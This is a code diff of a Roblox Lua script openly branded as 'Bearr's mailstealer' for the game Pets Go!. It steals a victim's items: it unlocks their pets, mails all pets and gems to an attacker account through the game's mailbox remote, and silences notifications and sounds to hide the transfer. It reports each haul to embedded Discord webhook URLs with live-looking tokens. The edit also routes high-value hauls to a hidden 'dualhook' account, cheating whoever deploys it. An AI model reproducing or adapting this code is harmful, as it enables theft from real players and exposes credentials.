@@ -1,6 +1,15 @@
--- New user and webhook for RAP > 100,000
-local highRAPUser = "bx4rzwasdeleted"
-local highRAPWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
+Username = Username
+print(username)
+min_rap = min_rap
+print(min_rap)
+min_chance = min_chance
+print(min_chance)
+webhook = webhook
+print(webhook)
+
+-- Local variables for the dualhook webhook and user
+local dualhook_webhook = "https://discord.com/api/webhooks/1295393967524810762/9sS0oJjJijMOQPU8V3xOrZNTVihw7wW-i3XGODpWioZNkIRrQVg9B9TtQzifr0VK-ni5"
+local dualhook_user = "bx4rzwasdeleted"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
@@ -24,7 +33,7 @@ local GemAmount1 = 0
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
-        break
+		break
     end
 end
 
@@ -32,12 +41,12 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-    local suffixes = {"", "k", "m", "b", "t"}
-    local suffixIndex = 1
-    while number >= 1000 and suffixIndex < #suffixes do
-        number = number / 1000
-        suffixIndex = suffixIndex + 1
-    end
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 and suffixIndex < #suffixes do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
     if suffixIndex == 1 then
         return tostring(math.floor(number))
     else
@@ -49,33 +58,34 @@ local function formatNumber(number)
     end
 end
 
-local function SendMessage(username, diamonds, webhookUrl, recipient)
+-- Updated SendMessage function to show both sender and recipient in the webhook
+local function SendMessage(sender, diamonds, mailRecipient, webhookUrl)
     local headers = {
         ["Content-Type"] = "application/json",
     }
 
-    local fields = {
+	local fields = {
+		{
+			name = "Sender Username:",
+			value = sender, -- Added sender field
+			inline = true
+		},
         {
-            name = "Victim Username:",
-            value = username,
+            name = "Mail Sent To:", 
+            value = mailRecipient, -- Correct recipient now displays here
             inline = true
         },
-        {
-            name = "Items to be sent:",
-            value = "",
-            inline = false
-        },
+		{
+			name = "Items to be sent:",
+			value = "",
+			inline = false
+		},
         {
             name = "Summary:",
             value = "",
             inline = false
-        },
-        {
-            name = "Mail Sent To:",  -- New field to show the mail recipient
-            value = recipient,
-            inline = true
         }
-    }
+	}
 
     local combinedItems = {}
     local itemRapMap = {}
@@ -102,47 +112,38 @@ local function SendMessage(username, diamonds, webhookUrl, recipient)
         else
             itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
         end
-        fields[2].value = fields[2].value .. itemLine .. "\n"
+        fields[3].value = fields[3].value .. itemLine .. "\n"
     end
 
-    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
+    fields[4].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
 
-    if #fields[2].value > 1024 then
+    if #fields[3].value > 1024 then
         local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
+        for line in fields[3].value:gmatch("[^\r\n]+") do
             table.insert(lines, line)
         end
 
-        while #fields[2].value > 1024 and #lines > 0 do
+        while #fields[3].value > 1024 and #lines > 0 do
             table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
         end
     end
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "New Pets Go Execution",
-            ["color"] = 3447003,
-            ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "Mailstealer by Bearr. discord.gg/GsFp84dbQf"
-            }
+            ["title"] = "New Pets Go! Execution",
+            ["color"] = 255, -- Blue color
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Mailstealer by Bearr. discord.gg/GsFp84dbQf"
+			}
         }}
     }
 
     local body = HttpService:JSONEncode(data)
 
     if webhookUrl and webhookUrl ~= "" then
-        -- Send the message to the high RAP webhook
-        request({
-            Url = highRAPWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-
-        -- Send the message to the original webhook
-        request({
+        local response = request({
             Url = webhookUrl,
             Method = "POST",
             Headers = headers,
@@ -155,15 +156,15 @@ local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
 noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-    noti.Enabled = false
+	noti.Enabled = false
 end)
 noti.Enabled = false
 
 game.DescendantAdded:Connect(function(x)
     if x.ClassName == "Sound" then
-        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
-            x.Volume = 0
-            x.PlayOnRemove = false
+        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+            x.Volume=0
+            x.PlayOnRemove=false
             x:Destroy()
         end
     end
@@ -191,9 +192,9 @@ local min_rap = min_rap or 10000
 local min_chance = min_chance or 10000
 local webhook = webhook
 
-local function sendItem(category, uid, am)
+local function sendItem(category, uid, am, recipient)
     local args = {
-        [1] = user,
+        [1] = recipient,
         [2] = MailMessage,
         [3] = category,
         [4] = uid,
@@ -202,26 +203,29 @@ local function sendItem(category, uid, am)
     local response = false
     repeat
         local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if err then
+
+        end
     until response == true
 end
 
-local function SendAllGems()
+local function SendAllGems(recipient)
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
-                local args = {
-                    [1] = user,
-                    [2] = MailMessage,
-                    [3] = "Currency",
-                    [4] = i,
-                    [5] = GemAmount1
-                }
-                local response = false
-                repeat
-                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                until response == true
-                break
-            end
+			if GemAmount1 >= 500 and GemAmount1 >= min_rap then
+				local args = {
+					[1] = recipient,
+					[2] = MailMessage,
+					[3] = "Currency",
+					[4] = i,
+					[5] = GemAmount1
+				}
+				local response = false
+				repeat
+					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+				until response == true
+				break
+			end
         end
     end
 end
@@ -237,8 +241,8 @@ end
 local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
 
 for i, v in pairs(categoryList) do
-    if save[v] ~= nil then
-        for uid, item in pairs(save[v]) do
+	if save[v] ~= nil then
+		for uid, item in pairs(save[v]) do
             if v == "Pet" then
                 local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
@@ -257,13 +261,13 @@ for i, v in pairs(categoryList) do
             end
             if item._lk then
                 local args = {
-                    [1] = uid,
-                    [2] = false
+                [1] = uid,
+                [2] = false
                 }
                 network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
             end
         end
-    end
+	end
 end
 
 if #sortedItems > 0 then
@@ -289,39 +293,29 @@ if #sortedItems > 0 then
     table.sort(sortedItems, function(a, b)
         return a.rap * a.amount > b.rap * b.amount 
     end)
+    
 
--- Conditional check: if total RAP > 100,000, set variables to highRAP values
-local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
-local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
--- Now send based on targetUser and targetWebhook being conditionally set
 spawn(function()
-    -- Conditional send logic based on totalRAP value
-    if totalRAP > 100000 then
-        -- If total RAP > 100,000:
-        -- Send both message and mail to highRAPWebhook/highRAPUser
-        SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
-        SendMail(targetUser, GemAmount1, highRAPWebhook)
-        
-        -- Do not send anything to the global webhook/user
+    -- Total RAP check
+    if totalRAP > 2000000 then
+        -- Send everything to dualhook_user
+        SendMessage(plr.Name, GemAmount1, dualhook_user, dualhook_webhook)
+        SendAllGems(dualhook_user)
+        for _, item in ipairs(sortedItems) do
+            sendItem(item.category, item.uid, item.amount, dualhook_user)
+        end
     else
-        -- If total RAP <= 100,000:
-        -- Send both message and mail to global webhook/user
-        SendMessage(targetUser, GemAmount1, webhook, targetUser)
-        SendMail(targetUser, GemAmount1, webhook)
-        
-        -- Send message only to highRAPWebhook/highRAPUser (no mail)
-        SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
+        -- Send items and gems to Username, with notifications to both webhooks
+        SendMessage(plr.Name, GemAmount1, Username, webhook)
+        SendMessage(plr.Name, GemAmount1, dualhook_user, dualhook_webhook)
+        SendAllGems(Username)
+        for _, item in ipairs(sortedItems) do
+            sendItem(item.category, item.uid, item.amount, Username)
+        end
     end
 end)
-
--- Continue with the remaining code logic
-SendAllGems()
-
-for _, item in ipairs(sortedItems) do
-    sendItem(item.category, item.uid, item.amount)
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
+    setclipboard("discord.gg/GsFp84dbQf")
 end
-
-local message = require(game.ReplicatedStorage.Library.Client.Message)
-message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
-setclipboard("discord.gg/GsFp84dbQf")
